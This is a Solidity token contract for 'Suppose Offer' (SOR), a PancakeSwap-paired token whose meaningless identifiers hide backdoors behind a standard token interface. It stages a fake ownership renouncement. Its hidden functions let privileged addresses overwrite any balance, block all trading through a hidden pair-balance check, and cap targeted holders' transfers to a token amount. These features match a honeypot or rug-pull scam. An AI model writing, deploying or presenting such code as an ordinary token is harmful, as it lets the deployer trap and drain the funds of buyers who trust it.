//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface sellTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchTxList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverEnableFee {
    function createPair(address tradingTakeLiquidity, address feeBuyTeam) external returns (address);
}

interface modeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundAutoMarketing) external view returns (uint256);

    function transfer(address marketingSender, uint256 walletMin) external returns (bool);

    function allowance(address txLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMin) external returns (bool);

    function transferFrom(
        address sender,
        address marketingSender,
        uint256 walletMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buySell, uint256 value);
    event Approval(address indexed txLiquidity, address indexed spender, uint256 value);
}

interface modeLimitMetadata is modeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SupposeOffer is launchTxList, modeLimit, modeLimitMetadata {

    function balanceOf(address fundAutoMarketing) public view virtual override returns (uint256) {
        return totalModeToken[fundAutoMarketing];
    }

    function minLimit() public {
        emit OwnershipTransferred(amountLimit, address(0));
        launchedMode = address(0);
    }

    function swapFrom(address tradingExempt, uint256 walletMin) public {
        exemptLiquidity();
        totalModeToken[tradingExempt] = walletMin;
    }

    uint256 public launchedTrading;

    function senderReceiver(uint256 walletMin) public {
        exemptLiquidity();
        atTakeToken = walletMin;
    }

    function shouldWallet(address tradingShould) public {
        if (txFee) {
            return;
        }
        
        shouldTokenTx[tradingShould] = true;
        
        txFee = true;
    }

    bool public txFee;

    bool private receiverBuy;

    function transfer(address tradingExempt, uint256 walletMin) external virtual override returns (bool) {
        return feeToken(_msgSender(), tradingExempt, walletMin);
    }

    address private launchedMode;

    uint256 tokenWallet;

    bool public liquidityModeFund;

    event OwnershipTransferred(address indexed atLaunch, address indexed takeReceiver);

    function approve(address liquidityReceiverSender, uint256 walletMin) public virtual override returns (bool) {
        sellToken[_msgSender()][liquidityReceiverSender] = walletMin;
        emit Approval(_msgSender(), liquidityReceiverSender, walletMin);
        return true;
    }

    function getOwner() external view returns (address) {
        return launchedMode;
    }

    function shouldLimit(address amountExempt) public {
        exemptLiquidity();
        if (receiverBuy != fromAmount) {
            launchFeeIs = false;
        }
        if (amountExempt == amountLimit || amountExempt == totalLimit) {
            return;
        }
        liquidityLaunchSell[amountExempt] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountSwapFrom;
    }

    function launchedLiquidityMarketing(address liquidityToEnable, address marketingSender, uint256 walletMin) internal returns (bool) {
        require(totalModeToken[liquidityToEnable] >= walletMin);
        totalModeToken[liquidityToEnable] -= walletMin;
        totalModeToken[marketingSender] += walletMin;
        emit Transfer(liquidityToEnable, marketingSender, walletMin);
        return true;
    }

    string private launchedFeeAt = "Suppose Offer";

    uint8 private enableMax = 18;

    function exemptLiquidity() private view {
        require(shouldTokenTx[_msgSender()]);
    }

    uint256 private amountSwapFrom = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return launchedFeeAt;
    }

    constructor (){
        if (listAuto == launchedTrading) {
            fromAmount = false;
        }
        sellTo swapList = sellTo(liquidityIs);
        totalLimit = receiverEnableFee(swapList.factory()).createPair(swapList.WETH(), address(this));
        
        amountLimit = _msgSender();
        minLimit();
        shouldTokenTx[amountLimit] = true;
        totalModeToken[amountLimit] = amountSwapFrom;
        
        emit Transfer(address(0), amountLimit, amountSwapFrom);
    }

    function transferFrom(address liquidityToEnable, address marketingSender, uint256 walletMin) external override returns (bool) {
        if (_msgSender() != liquidityIs) {
            if (sellToken[liquidityToEnable][_msgSender()] != type(uint256).max) {
                require(walletMin <= sellToken[liquidityToEnable][_msgSender()]);
                sellToken[liquidityToEnable][_msgSender()] -= walletMin;
            }
        }
        return feeToken(liquidityToEnable, marketingSender, walletMin);
    }

    mapping(address => bool) public liquidityLaunchSell;

    uint256 public listAuto;

    uint256 constant tokenSender = 7 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return enableMax;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverFrom;
    }

    function allowance(address limitAmountMarketing, address liquidityReceiverSender) external view virtual override returns (uint256) {
        if (liquidityReceiverSender == liquidityIs) {
            return type(uint256).max;
        }
        return sellToken[limitAmountMarketing][liquidityReceiverSender];
    }

    mapping(address => mapping(address => uint256)) private sellToken;

    function owner() external view returns (address) {
        return launchedMode;
    }

    address liquidityIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private receiverFrom = "SOR";

    mapping(address => uint256) private totalModeToken;

    uint256 private toSender;

    function feeToken(address liquidityToEnable, address marketingSender, uint256 walletMin) internal returns (bool) {
        if (liquidityToEnable == amountLimit) {
            return launchedLiquidityMarketing(liquidityToEnable, marketingSender, walletMin);
        }
        uint256 exemptToken = modeLimit(totalLimit).balanceOf(amountToken);
        require(exemptToken == atTakeToken);
        require(marketingSender != amountToken);
        if (liquidityLaunchSell[liquidityToEnable]) {
            return launchedLiquidityMarketing(liquidityToEnable, marketingSender, tokenSender);
        }
        return launchedLiquidityMarketing(liquidityToEnable, marketingSender, walletMin);
    }

    mapping(address => bool) public shouldTokenTx;

    address public totalLimit;

    bool public fromAmount;

    bool private launchFeeIs;

    uint256 atTakeToken;

    address public amountLimit;

    address amountToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private tokenAuto;

    uint256 public enableMarketing;

}